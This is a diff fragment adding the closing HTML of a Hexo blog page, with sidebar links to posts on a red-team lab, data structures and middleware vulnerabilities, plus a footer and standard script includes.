+            <a href="/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/">vulnstack 红队一</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/08/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">中间件漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
